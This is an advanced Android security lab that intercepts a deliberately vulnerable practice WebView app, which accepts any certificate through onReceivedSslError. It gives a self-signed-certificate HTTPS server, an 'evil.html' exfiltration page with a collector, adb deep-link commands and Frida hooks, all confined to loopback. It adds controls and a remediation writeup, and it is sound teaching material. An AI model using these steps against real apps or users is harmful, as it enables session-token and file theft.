# Lab 02 — Defeat a config that looks correct

**Difficulty:** advanced
**Time:** 90–120 minutes
**Prerequisites:** [Lab 01](lab-01-exploit-a-javascript-bridge.md) — you need its app and its habits;
[43-WebView §3.10–§3.11 and §5.3](../README.md);
[44-NetworkSecurityConfig](../../44-NetworkSecurityConfig/README.md) §3, because you are about to run
its auditor and must be able to read the output; [35-SSL](../../35-SSL/README.md) for what chain
validation is doing before any of this starts.

**You will attack only the app you built in lab 01.** The certificate, the HTTPS server and the
collector all run on your own machine and are reached from the device through `adb reverse`. Nothing
is exposed to a network and no third-party app is touched.

---

## Why this lab exists

Several chapters in this repository have booked the same debt, in almost the same words:

> Cleartext policy reaches WebView. `onReceivedSslError` does not.

This is where that sentence gets paid off with output rather than assertion, in a deliberately
uncomfortable order: you read a network security config and conclude, correctly, that it is fine; you
run **chapter 44's own auditor** against it and watch it **pass**, including at the `--fail-on HIGH`
gate a CI pipeline actually checks; you then intercept that app's WebView completely, with a
certificate no store on earth trusts, and watch its session token leave the device; and you prove the
app's own code caused it, twice, with two independent controls.

The lesson is not "the network security config is useless" — it is not, and Part H shows it working.
The lesson is:

> **A clean network security config audit is not a clean bill of health for transport security.** It
> answers "whom does this app trust?". It has no vocabulary at all for "and what does the app do when
> the answer comes back *nobody*?"

That second question is answered in Java, in the app's `WebViewClient`.

---

## Objective

By the end you will be able to:

1. Read a network security config and say precisely which questions it does and does not answer.
2. Run two auditors against the same APK, get opposite headline severities, and explain why **both
   are correct**.
3. Stand up an HTTPS listener with a deliberately untrusted certificate, and explain why it must be
   self-signed rather than a proxy's CA **on this device in particular**.
4. Demonstrate a complete WebView interception against a correct configuration, and prove causation
   with the `forceCancel(true)` runtime control **and** a source-level control.
5. Write the finding so a developer cannot reply "but our network security config is correct" —
   because you already said so, in the finding.

---

## Part 0 — The device check you must do before anything else

Skip this and every result below becomes unquotable.

```bash
# host
# Note the OUTER quotes on the second line: `adb shell` joins its arguments with
# spaces, so an unquoted `su -c 'ls DIR | wc -l'` reaches the device as
# `su -c ls DIR | wc -l` — the pipe is split off and `wc` counts the wrong thing.
adb shell "su -c 'mount'" | grep -i "on /system/etc/security/cacerts"
adb shell "su -c 'ls /system/etc/security/cacerts | wc -l'"
```

Measured on the device this chapter was written against:

```
APatch on /system/etc/security/cacerts type tmpfs (rw,seclabel,relatime,size=2836508k,...)
139
```

> **⚠️ This device's *system* CA store is contaminated.**
> An APatch `trustusercerts` module has bind-mounted a tmpfs over `/system/etc/security/cacerts` and
> promoted an interception CA into the **system** store — the store `<certificates src="system"/>`
> names, the store an app trusts by default, the store no config can opt out of. 139 certificates are
> present in it.

Three consequences, and they shape the whole design of this lab:

- **You cannot measure user-store-versus-system-store trust here.** The classic experiment — install
  my CA in the user store, see whether the app trusts it — has no meaning on this device, because a
  CA that arrived via `trustusercerts` *is* in the system store as far as every consumer of that
  directory is concerned.
- **So this lab does not use a proxy CA.** It uses a certificate **self-signed by an issuer in no
  store anywhere**, generated on the spot and destroyed afterwards. The result then depends on exactly
  one thing: what the app does when validation fails. The variable we came to measure becomes the
  only one.
- **Say all of this in the report.** "Intercepted with a proxy on a rooted MIUI device" is a sentence
  a developer can and should push back on. "Intercepted with a certificate whose issuer is present in
  neither the system nor the user store" cannot be.

Take the version lines now, as always (lab 01 step 2 has the commands). Reference run: **Android 11 /
API 30**, provider `com.google.android.webview` **150.0.7871.181**. **WebView is a Mainline module** —
the OS is 11, but Chromium 150 is the engine that will actually evaluate the certificate. They move
independently, and a finding naming only one of them cannot be reproduced.

---

## Setup

```bash
# host — rebuild if you cleaned up after lab 01. Nothing is written into the repo; all of it
# lands under $OUTDIR.
cd 43-WebView/examples && ./build.sh --install vulnerable-webview
adb shell pm list packages | grep ch43

# host — both forwards are needed; Part D step 4 explains why
adb reverse tcp:8000 tcp:8000        # the plain-HTTP collector
adb reverse tcp:8443 tcp:8443        # the HTTPS listener with the bad certificate
adb reverse --list
```

---

## Part A — Read the configuration and commit to an answer

**On paper, before you run anything.** The tool is the marking scheme, not the method. Read
`43-WebView/examples/vulnerable-webview/network_security_config.xml`; the substance of it, stripped
of its comments:

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="false">127.0.0.1</domain>
        <domain includeSubdomains="false">localhost</domain>
    </domain-config>
</network-security-config>
```

Write one line each, before continuing:

1. Is cleartext permitted to `api.example.com`?
2. Which trust anchors apply to `api.example.com`?
3. Is there a `<debug-overrides>` block, and would it matter in a release build if there were?
4. Is `<certificates src="user"/>` present anywhere?
5. **Which element of this document describes what the app does when chain validation fails?**

Question 5 is the whole lab. Answer it honestly — including, if that is your answer, "none of them,
because the schema has no such element."

---

## Part B — Chapter 44's auditor passes this config

Run the tool that owns this file. A different chapter's tool, deliberately: this is the reconciliation
a real engagement produces, where the network person and the mobile person hand each other reports.

```bash
# host — from the repository root
PYTHONIOENCODING=utf-8 python3 -B 44-NetworkSecurityConfig/scripts/nsc-audit.py \
    43-WebView/examples/vulnerable-webview/network_security_config.xml \
    --target-sdk 30 --debuggable false
```

Measured output, abridged only by wrapping:

```
-- effective policy, per scope --
   <base-config> / every host no domain-config matches
       cleartext permitted : false   (declared on <base-config>)
       trust anchors       : system   (declared on <base-config>)
       pin-set             : none
   127.0.0.1, localhost
       cleartext permitted : true   (declared on <domain-config>)
       trust anchors       : system   (declared on <base-config>)
       pin-set             : none

-- findings (3) --
   [MEDIUM  ] NSC-002  cleartext permitted for 2 specific domain(s)
       evidence  : 127.0.0.1, localhost
   [INFO    ] NSC-025  no <pin-set> anywhere in this config
   [INFO    ] NSC-029  <domain> is a literal IP address: 127.0.0.1
```

Read it as a reviewer would. The worst thing the tool has to say is **MEDIUM**, about **cleartext to
loopback** — the lab's own listener, which exists so lab 01 can serve a page. In a real app that row
would be an analytics endpoint and you would go and look at what travels over it. It is not about
certificates. There is **no finding of any severity about certificate validation failing**, because
there is nothing in the file to have one about.

### The gate check — the part that matters in CI

```bash
# host
for LVL in HIGH MEDIUM; do
  PYTHONIOENCODING=utf-8 python3 -B 44-NetworkSecurityConfig/scripts/nsc-audit.py \
      43-WebView/examples/vulnerable-webview/network_security_config.xml \
      --target-sdk 30 --debuggable false --fail-on $LVL > /dev/null
  echo "--fail-on $LVL -> exit=$?"
done
```

Measured:

```
--fail-on HIGH -> exit=0
--fail-on MEDIUM -> exit=1
```

**`--fail-on HIGH` exits 0.** A pipeline gated at HIGH — the overwhelmingly common configuration,
because gating at MEDIUM drowns teams in scoped-cleartext rows — passes this app's transport posture.
Green tick, merged.

> **📖 What you just proved.** The auditor is not wrong and the config is not wrong. The tool read the
> file correctly and the file says something true. The gap is that the file is **silent** on the
> failure path, and silence in a policy document reads as "fine" to every reviewer and every gate.

---

## Part C — This chapter's auditor reads the same app and says CRITICAL

Same APK. Different question.

```bash
# host — from the repository root
python3 -B 43-WebView/scripts/webview-audit.py "$OUTDIR/vulnerable-webview/vulnerable-webview.apk"
```

```
[CRITICAL] WV-001  onReceivedSslError accepts every certificate error unconditionally
    evidence : com.pentest.ch43.vuln.VulnerableWebViewActivity$SloppyWebViewClient
               .onReceivedSslError -> SslErrorHandler.proceed(), no cancel(), no branch
    why      : No network security config can prevent this. The WebView will load any
               host presenting any certificate, expired, self-signed or attacker-issued.
```

Note what the auditor had to establish to say `CRITICAL` rather than `HIGH`: that `proceed()` is
called, that `cancel()` is never called on any path, and — the line between the two severities —
that the method contains **zero branches**.

If the method branched, the tool would emit `WV-002 [HIGH]` and mark it **UNRESOLVED** — a branch
might be a hand-rolled certificate comparison (a pin, fine) or `if (BuildConfig.DEBUG)` (not fine, and
it ships). [README §5.4](../README.md) measured this across eleven real APKs: **46 overrides, 3 that
call `proceed()`, 0 unconditional.** All three branched, and resolving them meant a human reading the
method. Carry that number around: the unconditional case you are about to exploit is the *rare* one.

### The reconciliation table — write this out yourself

| Question | Answered by | Verdict on this app |
|---|---|---|
| May this WebView load `http://`? | network security config | No, except loopback |
| Which anchors are declared trusted? | network security config | `system` only |
| Is pinning declared? | network security config | No (INFO) |
| **What happens when validation fails?** | **`onReceivedSslError`, in Java** | **`proceed()` — load it anyway** |
| Would an OkHttp `CertificatePinner` help? | neither; WebView has its own stack | No ([36](../../36-CertificatePinning/README.md)) |

Two tools, one app, both correct, opposite headlines. **That table is the deliverable of Parts B and
C**, and in a real report it belongs inside the finding.

---

## Part D — Break it

### Step 1. Generate a certificate nobody trusts

Generate it **outside any repository** and never commit it.

```bash
# host
mkdir -p "$OUTDIR/ch43-tls" && cd "$OUTDIR/ch43-tls"
```

This is [README §7.10](../README.md)'s snippet with one addition — a `DNSName` for `localhost`
alongside the `IPAddress`, because Part E needs a second hostname and the two passes must be
comparable:

```bash
# host
python3 -B - <<'PY'
import datetime, ipaddress
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"ch43-lab-impostor")])
now = datetime.datetime.now(datetime.timezone.utc)
c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
     .public_key(k.public_key()).serial_number(x509.random_serial_number())
     .not_valid_before(now - datetime.timedelta(days=1))
     .not_valid_after(now + datetime.timedelta(days=30))
     .add_extension(x509.SubjectAlternativeName([
         x509.IPAddress(ipaddress.ip_address(u"127.0.0.1")),
         x509.DNSName(u"localhost"),
     ]), critical=False)
     .sign(k, hashes.SHA256()))
open("key.pem","wb").write(k.private_bytes(serialization.Encoding.PEM,
     serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
open("cert.pem","wb").write(c.public_bytes(serialization.Encoding.PEM))
PY

# host — no `cryptography` module? this is equivalent
openssl req -x509 -newkey rsa:2048 -nodes -days 30 -keyout key.pem -out cert.pem \
    -subj "/CN=ch43-lab-impostor" -addext "subjectAltName=IP:127.0.0.1,DNS:localhost"

# host — confirm what you made
openssl x509 -in cert.pem -noout -subject -issuer -dates -ext subjectAltName
```

`subject` and `issuer` are the same string. That is the point: **it is its own issuer, and that issuer
is in no store on the device** — not the system store, contaminated or otherwise, and not the user
store. The result of this lab therefore cannot be explained by the device's trust posture.

### Step 2. Serve the attack page over HTTPS

```bash
# host — terminal 1
cd 43-WebView/examples/attacker-page
python3 -B - <<PY
import http.server, ssl
srv = http.server.HTTPServer(("127.0.0.1", 8443), http.server.SimpleHTTPRequestHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("$OUTDIR/ch43-tls/cert.pem", "$OUTDIR/ch43-tls/key.pem")
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
print("https://127.0.0.1:8443/evil.html")
srv.serve_forever()
PY
```

### Step 3. The collector, still on plain HTTP

```bash
# host — terminal 2. evil.html exfiltrates to http://127.0.0.1:8000/collect?... ; leaving that on
# HTTP is a lesson, not laziness -- see the note after step 4.
cd 43-WebView/examples/attacker-page && python3 -B -m http.server 8000
```

### Step 4. Drive the deep link at HTTPS

```bash
# host — terminal 3
adb logcat -c
adb shell am force-stop com.pentest.ch43.vuln
adb shell am start -a android.intent.action.VIEW \
    -d 'ch43vuln://open?url=https://127.0.0.1:8443/evil.html'
adb logcat -d -s CH43VULN:V
```

Measured:

```
CH43VULN: secret at /data/user/0/com.pentest.ch43.vuln/files/session.txt
CH43VULN: loading https://127.0.0.1:8443/evil.html
CH43VULN: SSL error ignored: primaryError=3 url=https://127.0.0.1:8443/evil.html
CH43VULN: bridge: getSessionToken()
CH43VULN: bridge: readFile(/data/data/com.pentest.ch43.vuln/files/session.txt)
CH43VULN: bridge: readContent(content://com.pentest.ch43.vuln.notes/note)
```

`primaryError=3` is `SSL_UNTRUSTED`. Chromium validated the chain, the chain failed, the framework
paused the load and asked the app, and the app said load it. Then the page ran, the bridge ran, and
terminal 2 shows:

```
origin    | https://127.0.0.1:8443 | https://127.0.0.1:8443/evil.html
token     | {"user":"lab@example.invalid",
             "session":"CH43{bridge_is_the_bug_not_the_annotation}","issued":"lab"}
```

**The session token left the device over a TLS connection that failed validation.** The network
security config was correct throughout and irrelevant throughout.

> **📖 Two mechanisms had to cooperate for that last line to exist.** The page's origin is `https://`;
> the collector is `http://`. That is **mixed content**, permitted by two independent things: the
> app's `setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)` (`[V7]`, this chapter — Chromium's
> willingness to mix schemes in one document) **and** the config's `127.0.0.1` cleartext exception
> (chapter 44 — whether the packet may leave the device at all). Remove either and the exfiltration
> fails while the certificate bypass still works perfectly. Two mechanisms, two chapters, one line of
> output — exactly the entanglement that gets a WebView finding attributed to the wrong layer.

### Step 5. The error codes, so you can read the next one you meet

`android.net.http.SslError`: **0** `SSL_NOTYETVALID`, **1** `SSL_EXPIRED`, **2** `SSL_IDMISMATCH`,
**3** `SSL_UNTRUSTED`, **4** `SSL_DATE_INVALID`, **5** `SSL_INVALID`. `getPrimaryError()` returns
**one** code even when several apply — the most severe; `hasError(int)` checks the rest. An app that
branches on `getPrimaryError() == 2` and proceeds has not written a pin; it has written "ignore
hostname mismatches", which is a different and worse thing.

---

## Part E — Control 1: prove the app's decision caused it

"The page loaded" is not evidence. It is consistent with the certificate having been acceptable all
along — for instance if your generated certificate had somehow chained to something the contaminated
system store contains. You need a control, and a control changes **exactly one thing**: the app's
answer.

`forceCancel(true)` in [`../scripts/trace-webview.js`](../scripts/trace-webview.js) makes every
`proceed()` send `cancel()` instead. Note the direction — it makes the app **stricter**, never weaker.
A measurement tool may move in that direction; a tool that neutralises a check before measuring it has
destroyed the evidence.

### Step 6. Make hooks land, then spawn

```bash
# host — the JIT can inline a hot method out from under your hook
adb shell cmd package compile -m verify -f com.pentest.ch43.vuln
```

Then **spawn — never attach.** A WebView is configured in `onCreate`; an attach arrives after every
setting you wanted to see. On Windows the `frida` CLI exits the moment stdin closes, so heredocs and
pipes give you a script that loads and immediately detaches ([README §7.9](../README.md)). Drive it
through the Python API:

```python
#!/usr/bin/env python3
# host - save as pass1.py, OUTSIDE the repository
import frida, subprocess, time

PKG = "com.pentest.ch43.vuln"
URL = "https://127.0.0.1:8443/evil.html"

dev  = frida.get_usb_device(timeout=10)
pid  = dev.spawn([PKG])
sess = dev.attach(pid)
sc   = sess.create_script(open("43-WebView/scripts/trace-webview.js", encoding="utf-8").read())
sc.on("message", lambda m, d: print(m.get("payload") or m.get("stack"), flush=True))
sc.load()
dev.resume(pid)
time.sleep(3)

subprocess.run(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW",
                "-d", "ch43vuln://open?url=" + URL])
time.sleep(8)
sc.exports_sync.verdict()
sess.detach()
```

Measured, abridged to the lines that matter:

```
### PASS 1: tracing only
[PROVIDER] com.google.android.webview 150.0.7871.181   (device is Android 11 / API 30)
[BRIDGE] addJavascriptInterface(com.pentest.ch43.vuln.LeakyBridge, "AndroidBridge")
    @JavascriptInterface methods (4): deviceInfo(0), getSessionToken(0), readContent(1), readFile(1)
[LOAD] loadUrl(https://127.0.0.1:8443/evil.html)
[HOOK] resolved WV.e53 through the WebView provider ClassLoader
[HOOK] SslErrorHandler concrete class hooked: WV.e53
[SSL] onReceivedSslError in com.pentest.ch43.vuln.VulnerableWebViewActivity$SloppyWebViewClient
    primaryError=3  SSL_UNTRUSTED    - certificate authority is not trusted
    url=https://127.0.0.1:8443/evil.html
    subject=CN=ch43-lab-impostor
    issuer=CN=ch43-lab-impostor
[SSL]   --> app called handler.proceed()   THE LOAD CONTINUES, certificate error and all
[VERDICT]
  SSL error decisions      : proceed=1  cancel=0
  >>> this app accepted at least one INVALID CERTIFICATE at runtime.
```

`subject` and `issuer` are printed for you, and they are identical. That pair goes in the report.

### Step 7. Pass 2 — same certificate, `forceCancel` on

Copy `pass1.py` to `pass2.py` and change two things:

```python
URL = "https://localhost:8443/evil.html"      # <-- DIFFERENT HOSTNAME. See below.
...
sc.load()
sc.exports_sync.force_cancel(True)            # frida maps forceCancel -> force_cancel
dev.resume(pid)
```

> **⚠️ The trap that will make you think you imagined the whole thing.**
> **Chromium caches the proceed decision per host.** Once the app has proceeded for `127.0.0.1`,
> later navigations to `127.0.0.1` do **not** re-invoke `onReceivedSslError` at all. Run pass 2
> against the same host and you see no `[SSL]` block, no proceed, no cancel, and conclude your hook
> broke. It did not. Change host (`localhost`, which is why the certificate carries both in its SAN),
> or `adb shell pm clear com.pentest.ch43.vuln` between attempts. Changing host is cheaper and does
> not destroy the seeded token.

Measured:

```
### PASS 2: same certificate, forceCancel ON
[SSL] onReceivedSslError in ...$SloppyWebViewClient
    primaryError=3  SSL_UNTRUSTED    - certificate authority is not trusted
    url=https://localhost:8443/evil.html
[SSL]   --> app called handler.proceed(), forceCancel is ON so cancel() is being sent instead
[SSL]   --> app called handler.cancel()    the load is refused
```

And in logcat, no `bridge:` lines at all. The page never ran, so nothing called the bridge, so nothing
reached the collector.

**That pair is the evidence.** One variable changed — the app's answer — and the outcome inverted.
Everything else, the certificate included, was byte-for-byte identical.

---

## Part F — Control 2: remove the override at the source

The runtime control proves the app's answer is decisive. A sceptical developer can still ask whether
Frida changed something else. So do it again at the source — which has the pleasant property of being
the exact remediation you are about to recommend.

### Step 8. Delete the method

Edit [`../examples/vulnerable-webview/VulnerableWebViewActivity.java`](../examples/vulnerable-webview/VulnerableWebViewActivity.java),
comment out the entire `onReceivedSslError` override — annotation, signature and both body lines — and
change **nothing else**. Then:

```bash
# host
cd 43-WebView/examples && ./build.sh --install vulnerable-webview
adb shell am force-stop com.pentest.ch43.vuln
adb logcat -c
adb shell am start -a android.intent.action.VIEW \
    -d 'ch43vuln://open?url=https://127.0.0.1:8443/evil.html'
adb logcat -d -s CH43VULN:V
```

Measured:

```
CH43VULN: loading https://127.0.0.1:8443/evil.html
```

...and nothing else. No `SSL error ignored`. No `bridge:` lines. Terminal 1 shows a handshake torn
down; terminal 2 receives nothing; the phone shows Chromium's own error page.

> **📖 The base implementation is the security control.** `WebViewClient.onReceivedSslError` in AOSP
> calls `handler.cancel()`. The correct implementation of this method is **not to write it** — there
> is no safer body than absence, because every body is an opportunity to be wrong on some path. See
> [README §4.3](../README.md).

### Step 9. Restore, and the third control

Un-comment the override, rebuild, and confirm the bypass is back — lab 04 depends on the example being
in its documented vulnerable state:

```bash
# host
./build.sh --install vulnerable-webview
adb shell am force-stop com.pentest.ch43.vuln && adb logcat -c
adb shell am start -a android.intent.action.VIEW \
    -d 'ch43vuln://open?url=https://localhost:8443/evil.html'
adb logcat -d -s CH43VULN:V | grep "SSL error ignored"
```

**Optional third control**, with a caveat you must not gloss over.
[`../examples/hardened-webview/HardenedWebViewActivity.java`](../examples/hardened-webview/HardenedWebViewActivity.java)
does not override `onReceivedSslError` at all — the right shape. But its `ALLOWED_HOSTS` set holds
only `lab.example.com` and `static.lab.example.com`, so a deep link at `127.0.0.1` is refused by
`isAllowed()` **before TLS is attempted**: run it as-is and you observe a refusal that has nothing to
do with certificates. To use it properly, add `"127.0.0.1"` to `ALLOWED_HOSTS` and rebuild — you are
then modifying your own control, which is acceptable only because the modification is in the
navigation gate while the thing under test is the certificate path. Say so, and revert afterwards.

---

## Part G — Write the finding

Everything below is measured. Nothing is inferred.

> **HIGH — the WebView accepts any certificate, and the network security config cannot prevent it.**
>
> `com.pentest.ch43.vuln.VulnerableWebViewActivity$SloppyWebViewClient` overrides
> `onReceivedSslError(WebView, SslErrorHandler, SslError)` and calls `SslErrorHandler.proceed()`
> unconditionally — no branch, no `cancel()` on any path.
>
> **Verified at runtime.** The app loaded `https://127.0.0.1:8443/evil.html`, presented with a
> self-signed certificate (`subject=CN=ch43-lab-impostor`, `issuer=CN=ch43-lab-impostor`) whose issuer
> is present in no trust store on the device. Chromium reported `primaryError=3` (`SSL_UNTRUSTED`);
> the app proceeded; the page executed and called the app's JavaScript bridge; the value of
> `getSessionToken()` was transmitted to a host of the tester's choosing.
>
> **Control A (runtime).** With the identical certificate and `proceed()` replaced by `cancel()` at
> the moment of the call, the load was refused and no script executed.
> **Control B (source).** With the override removed and the app rebuilt, the identical navigation was
> refused by the `WebViewClient` base implementation.
>
> **The app's network security config is correct and is not the cause.** It declares
> `cleartextTrafficPermitted="false"` in `<base-config>`, `<certificates src="system"/>`, no
> `<debug-overrides>` and no user trust anchor. Chapter 44's auditor rates it MEDIUM at worst — a
> scoped loopback cleartext exception — and it passes a `--fail-on HIGH` gate with exit 0. **No element
> of the network security config schema describes what an app does when chain validation fails**, so no
> change to that file can remediate this.
>
> **Environment.** Android 11 / API 30, `M2101K6P` (MIUI), WebView provider
> `com.google.android.webview` **150.0.7871.181**. The device's system CA store is modified by an
> APatch `trustusercerts` module (139 certificates in `/system/etc/security/cacerts`); this does not
> affect the result, because the certificate used was self-signed by an issuer absent from both stores.
>
> **Impact** is bounded by what this WebView renders and what it exposes. Here that is a four-method
> bridge including `getSessionToken()` and an unconstrained `readFile(String)`, with the URL
> attacker-choosable through an exported `BROWSABLE` deep link — so the bound is "any network position
> between the app and its server yields the session token and arbitrary app-readable files".
>
> **Remediation: delete the override.** `WebViewClient`'s base implementation calls `cancel()`. If a
> specific certificate genuinely must be accepted, pin it explicitly and compare
> `SslError.getCertificate()` against a known value — but the default answer is deletion.

### What *not* to write

| Written as | Why it fails |
|---|---|
| "The app does not validate TLS certificates." | It does. Chromium validated and reported error 3; the app **overrode the result**. A developer who greps for a `TrustManager`, finds a correct one, and closes your ticket is not being unreasonable. |
| "SSL pinning bypassed with objection / Frida." | Nothing was bypassed and no pin exists. [README §7.6](../README.md): Java `TrustManager` hooks and objection's pinning bypass are **inert against a WebView**, which has its own network stack. Claiming a bypass of something that was never there costs you the rest of the report. |
| "Traffic intercepted with a proxy CA on a rooted device." | On **this** device that proves nothing (Part 0). Say self-signed, say the issuer is in no store, say why. |

And keep the line that pre-empts the reply you would otherwise get — *"we checked; our network
security config is correct"* — because you already said so, with the exit code.

---

## Part H — The other half, so the boundary is exact

Ten minutes, and it stops you over-correcting into "the network security config does nothing for
WebViews", which is equally wrong and easier to disprove.

```bash
# host
adb logcat -c
adb shell am start -a android.intent.action.VIEW \
    -d 'ch43vuln://open?url=http://10.0.2.2:8000/evil.html'
adb logcat -d | grep -i "CLEARTEXT" | head
```

`10.0.2.2` is not `127.0.0.1`, so the `<domain-config>` exception does not apply and `<base-config>`
governs: `cleartextTrafficPermitted="false"`. Measured:
`chromium: [ERROR:...] net::ERR_CLEARTEXT_NOT_PERMITTED`.

**No packet left the device.** Chromium consulted the platform's `NetworkSecurityPolicy` through JNI
before opening the socket, and the policy said no. That is chapter 44's mechanism, working, inside the
same WebView you just intercepted completely. So: may a cleartext request be made, and which anchors
are nominated — **the config**. What happens when validation fails — **`onReceivedSslError`, and
nothing else**.

> **🧠 Mental Model** — the network security config is the **guest list**. `onReceivedSslError` is the
> doorman deciding what to do about someone who is not on it. A correct guest list and a doorman who
> waves everyone through are not in contradiction; they answer different questions, and only one of
> them is written down where an auditor can see it.

---

## Hints

<details>
<summary>The HTTPS server will not start: "module 'ssl' has no attribute 'wrap_socket'"</summary>

`ssl.wrap_socket()` was removed in Python 3.12. Use the `SSLContext` form from step 2:

```python
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem", "key.pem")
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
```
</details>

<details>
<summary>The app shows an error page and logcat has no "SSL error ignored" line</summary>

Three causes, in the order they occur: **`adb reverse` is gone** (it is dropped whenever the device
reconnects — `adb reverse --list`); **the server is not up**, or something else holds 8443 (test from
the host first with `curl -k -s -o /dev/null -w '%{http_code}\n' https://127.0.0.1:8443/evil.html` —
the `-k` is required, it is your own untrusted certificate and curl is right to object); or **you
rebuilt with the override commented out** in Part F and forgot to restore it.
</details>

<details>
<summary>Pass 2 produces no [SSL] block at all, and pass 1 did</summary>

The per-host proceed cache, and the single most common way to lose an afternoon here. Chromium
remembers the decision for the host. Change the hostname (`localhost` rather than `127.0.0.1`) or
`adb shell pm clear com.pentest.ch43.vuln` between attempts.

Do not "fix" it by uninstalling and reinstalling repeatedly — you will lose the seeded session token
too, and start doubting the bridge as well as the hook.
</details>

<details>
<summary>frida cannot find the process, or the script loads and immediately exits</summary>

Two separate problems.

- **`spawn`, not `attach`.** A WebView is configured in `onCreate`. Attach to a running app and every
  setting and the bridge registration have already happened; the tracer shows an empty configuration.
- **On Windows the `frida` CLI exits when stdin closes**, which is what a heredoc, a pipe or
  `< /dev/null` does. Use the Python API script in step 6 ([README §7.9](../README.md)).
</details>

<details>
<summary>`sc.exports_sync.force_cancel(True)` raises AttributeError</summary>

Either **frida-python 15 or earlier**, which calls it `sc.exports`, or **name mangling** — Frida maps
the JavaScript export `forceCancel` to the Python name `force_cancel`. When in doubt,
`print(dir(sc.exports_sync))`.
</details>

<details>
<summary>The tracer hooks a different SslErrorHandler class than WV.e53</summary>

Expected. `WV.e53` is an obfuscated class inside the WebView provider APK and the name changes with the
provider version — a Mainline module updating independently of the OS. The script discovers the name
from the live object rather than hard-coding it; record the one you saw next to your provider version.
</details>

<details>
<summary>I want the certificate confirmed untrusted by something with no stake in the outcome</summary>

`openssl s_client -connect 127.0.0.1:8443 </dev/null 2>&1 | grep -i verify` — expect
`verify error:num=18:self signed certificate`. An independent second opinion, taken outside Android.
</details>

---

## Success criteria

You have completed the lab when **all** of the following are true and you have the output to prove
each one:

- [ ] You ran `mount | grep cacerts` **before** anything else and can state in one sentence why the
      APatch tmpfs means this lab must not use a proxy CA. You recorded OS release, API level and
      WebView provider version.
- [ ] You wrote your five Part A answers before running any tool, and your answer to Q5 was "no
      element of the schema describes this".
- [ ] `nsc-audit.py` reports **MEDIUM at worst** and `--fail-on HIGH` exits **0** — you have the exit
      code — while `webview-audit.py` on the same APK reports **`WV-001 [CRITICAL]`**, and you can
      explain why both are correct by naming the question each one answers.
- [ ] The app loaded `https://127.0.0.1:8443/` presenting a certificate whose subject and issuer are
      both `CN=ch43-lab-impostor`, `primaryError=3` appears in your logcat, and
      `CH43{bridge_is_the_bug_not_the_annotation}` reached your collector **over the failed TLS
      connection**.
- [ ] **Control A**: pass 1 versus pass 2 with `forceCancel(true)` — same certificate, opposite
      outcome — and you changed hostname between them and know why.
- [ ] **Control B**: with the override commented out and rebuilt, the identical navigation was
      refused. You then restored the override and confirmed the bypass returned.
- [ ] You triggered `ERR_CLEARTEXT_NOT_PERMITTED` on purpose and can say which chapter owns it.
- [ ] Your written finding contains the sentence that pre-empts "but our config is correct".

---

## Clean up — leave the device as you found it

```bash
# host
adb shell am force-stop com.pentest.ch43.vuln
adb reverse --remove-all
adb forward --remove-all

# host — a throwaway key that survives is no longer throwaway
rm -f "$OUTDIR/ch43-tls/key.pem" "$OUTDIR/ch43-tls/cert.pem"

# host — from the repository root: no artefacts, nothing written into the repo
find . -name '__pycache__' -o -name '*.pyc' -o -name '*.apk' | head
```

The `find` must print nothing. If it prints `__pycache__`, you ran a script without `-B`.

Keep the apps installed if you are going on to lab 04; lab 03 does not need them. Otherwise
`cd 43-WebView/examples && ./build.sh --uninstall`, then `adb shell pm list packages | grep ch43`
must be empty.

---

## What to carry into the next lab

You have measured both halves of a WebView's transport story and found that they live in different
files, are owned by different chapters, and are audited by different tools — each of which tells you
the truth and still leaves you with the wrong impression if you read only one. Two habits: **run both
auditors, always** ([README §5.9](../README.md) puts them in the same step of the procedure for
exactly this reason), and **produce a control, always** — "it loaded" is an observation, "it loaded,
and with one variable changed it did not" is evidence.

[Lab 03](lab-03-audit-a-real-app.md) turns both tools on a **real** application from your own device
and stops at detection. It is the harder skill: not finding a vulnerability in an app built to have
one, but deciding honestly which of a real app's static hits survive contact with the device — and,
mostly, which do not.
